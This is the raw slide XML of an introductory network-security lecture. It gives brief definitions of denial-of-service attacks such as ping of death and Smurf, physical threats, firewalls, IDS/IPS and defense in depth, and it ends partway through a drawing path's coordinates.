            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>” uses ICMP packets that are too big. </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Sends ICMP traffic as a series of fragments in an attempt to overflow </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike" u="sng">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="ffffff"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>the fragment reassembly buffers </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>on the target device. </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u="sng">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="ffffff"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Smurf attack </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>can use ICMP traffic directed to a subnet to flood a target system with ping replies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Availability Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="365" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066680" y="1828800"/>
            <a:ext cx="6780960" cy="422532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Availability Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36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c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Electrical disturbances</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Power fault: A brief electrical outage</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Blackout: An extended electrical outage</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Availability Attacks</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36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Attacks on a system’s physical environment</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Temperature</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Gas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TextShape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7771680" cy="1469160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Security Mechanisms</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="371" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="3581280"/>
            <a:ext cx="6400080" cy="175176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pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Firewalls</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>IDS/IPS</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Cryptography</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Defense in Depth </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37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No single access control mechanism is ever deployed on its own.</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Multiple layers or levels of access controls are deployed to provide layered security or defense in depth.</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Any layer of protection might fail</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105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 </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Defense in Depth Example</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="375" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="7771680" cy="4342680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="376" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="1523880"/>
            <a:ext cx="6780960" cy="4968000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="936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TextShape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7771680" cy="1469160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Firewalls</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="36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Access Control Policy</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37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It is the corporate policy which states what type of access is allowed across the organization’s network</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Example</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a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Our internal users can access Internet Web sites and FTP sites or send SMTP mail, but we only allow inbound SMTP mail from the internet to our internal users” </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A clearly defined access control policy helps to select the correct firewall product</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="24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Access Control Descriptors</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38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Direction</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>	</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Inbound or outbound</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Service</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HTTP, FTP …etc. </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Specific host</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Time of day</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What is a firewall?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="383" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1600200"/>
            <a:ext cx="7771680" cy="45298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A firewall is a system that enforces the access control policy</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Main purpose</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To control access to or from a protected network . </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It implements a network access policy by forcing connections to pass through the firewall, where they can be examined and evaluated</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2700" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2700" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="343080" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:tabLst>
                <a:tab algn="l" pos="0"/>
              </a:tabLst>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="384" name="Picture 4" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="4744800"/>
            <a:ext cx="2285280" cy="211248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What is a firewall?</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="386"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The firewall isolates an organization’s internal network from a larger external network, allowing some packets to pass, blocking others</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="387" name="CustomShape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2427120" y="3276720"/>
            <a:ext cx="2653560" cy="1550160"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="1672" h="977">
                <a:moveTo>
                  <a:pt x="54" y="16"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="57" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="116" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="127" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="138" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="149" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="174" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="187" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="200" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="212" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="225" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="253" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="281" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="309" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="352" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="366" y="86"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="380" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394" y="95"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="408" y="97"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="422" y="100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="436" y="103"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="451" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="465" y="105"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="477" y="105"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="491" y="105"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="504" y="105"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="518" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="532" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="559" y="100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="586" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="614" y="95"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="641" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="670" y="86"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="698" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="727" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="757" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="774" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="789" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="804" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="820" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="837" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="853" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="871" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="888" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="906" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="923" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="942" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="961" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="980" y="95"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1003" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1024" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1046" y="106"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1069" y="110"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1092" y="114"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1117" y="119"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1141" y="124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1190" y="134"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1239" y="146"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1288" y="159"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1313" y="166"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1337" y="173"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1361" y="180"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1384" y="187"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1406" y="195"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1429" y="203"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1450" y="211"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1471" y="220"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1490" y="229"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1509" y="238"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1527" y="248"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1535" y="252"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1543" y="258"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1551" y="263"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1558" y="267"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1565" y="273"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1572" y="279"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1579" y="284"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1585" y="290"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1591" y="296"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1597" y="301"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1607" y="313"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1616" y="326"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1625" y="340"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1633" y="355"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1640" y="370"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1647" y="385"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1651" y="403"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1656" y="419"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1661" y="438"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1664" y="456"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1667" y="474"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1669" y="493"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1671" y="512"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1671" y="530"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1672" y="550"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1671" y="569"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1671" y="588"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1670" y="607"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1668" y="626"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1665" y="645"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1663" y="662"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1660" y="680"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1656" y="697"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1651" y="715"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1648" y="731"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1643" y="747"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1637" y="762"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1632" y="776"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1626" y="790"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1620" y="803"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1614" y="814"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1607" y="825"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1600" y="834"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1592" y="843"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1584" y="852"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1574" y="859"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1564" y="867"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1553" y="873"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1543" y="879"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1531" y="884"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1518" y="890"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1506" y="895"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1493" y="898"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1479" y="902"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1465" y="905"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1451" y="909"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1436" y="912"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1420" y="915"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1390" y="919"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1358" y="923"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1326" y="926"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1293" y="930"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1259" y="932"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1227" y="936"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1194" y="939"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1162" y="944"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1146" y="946"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1130" y="949"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1112" y="950"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1095" y="952"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1077" y="954"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1059" y="956"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1041" y="958"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1022" y="959"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="984" y="963"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="945" y="966"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="907" y="969"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="867" y="970"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="829" y="972"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="791" y="973"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="773" y="974"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="754" y="974"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="736" y="976"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="718" y="976"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="701" y="976"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="684" y="977"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="668" y="977"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="651" y="977"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="636" y="977"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="621" y="977"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="607" y="977"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="593" y="977"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="580" y="976"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="567" y="976"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="556" y="976"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="544" y="974"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="532" y="974"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="522" y="974"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="511" y="973"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="502" y="972"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="493" y="972"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="483" y="971"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="474" y="970"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="465" y="969"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="448" y="966"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="432" y="964"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="417" y="960"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401" y="958"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="372" y="950"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="357" y="946"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="342" y="942"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="326" y="937"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="308" y="932"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="291" y="928"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="273" y="923"/>
                </a:lnTo>
                <a:lnTo>
